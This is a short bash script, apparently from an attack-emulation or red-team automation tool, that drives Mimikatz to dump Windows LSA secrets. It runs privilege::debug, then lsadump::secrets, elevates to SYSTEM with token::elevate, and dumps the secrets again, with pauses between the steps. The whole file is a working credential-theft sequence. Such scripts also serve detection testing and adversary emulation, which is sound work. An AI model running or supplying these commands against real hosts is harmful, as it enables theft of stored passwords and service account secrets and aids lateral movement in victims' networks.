#!/bin/bash

: '
Mimikatz: Dump lsa secrets.
'

execute_command "privilege::debug"
create_new_line
sleep 1

execute_command "lsadump::secrets"
create_new_line
sleep 1

execute_command "token::elevate"
create_new_line
sleep 1

execute_command "lsadump::secrets"
create_new_line
